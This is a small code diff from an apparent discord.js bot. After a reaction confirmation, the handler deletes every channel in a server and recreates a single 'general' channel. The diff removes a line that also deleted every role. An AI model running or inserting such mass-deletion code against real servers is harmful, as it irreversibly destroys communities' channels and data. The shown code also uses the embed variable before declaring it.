@@ -50,7 +50,6 @@ msg.channel.send("`تم الالغاء`")
 message.delete();
 })
 ds.on("collect", r => {
-message.guild.roles.forEach(r => { r.delete() }) 
      message.guild.channels.forEach(c => { c.delete() })
      message.guild.createChannel('general', 'text').then(c=> c.send(ra3d));
      let ra3d = new Discord.RichEmbed()
